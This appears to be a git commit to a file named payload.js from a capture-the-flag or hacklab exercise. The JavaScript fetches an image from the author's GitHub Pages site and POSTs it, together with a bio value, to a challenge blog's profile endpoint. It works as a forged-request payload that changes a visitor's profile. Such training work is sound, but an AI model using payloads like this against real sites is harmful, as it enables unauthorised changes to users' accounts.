73836e14a989707a11dd372aa97108aa60eb021e
Matias Lima <matiaselima@hotmail.com>
2026-09-24 05:52:28 -0300

    probando 3

--- payload.js
+++ payload.js
@@ -1,10 +1,15 @@
-var formData = new FormData();
-formData.append("bio", "None"); 
-var fakeImage = new Blob(["imagen_modificada"], { type: "image/jpeg" });
-formData.append("profile_pic", fakeImage, "hacker.jpg");
+fetch('https://matiaselima.github.io/ctf/133954957131333153.jpg')
+  .then(res => res.blob())
+  .then(blob => {
+      var formData = new FormData();
+      formData.append("bio", "None"); 
+      formData.append("profile_pic", blob, "133954957131333153.jpg");
+      fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
+        method: 'POST',
+        body: formData
+      });
+  });
 
 // Recuerda poner la ruta correcta de la petición original aquí
-fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
-  method: 'POST',
-  body: formData
-});
+
+
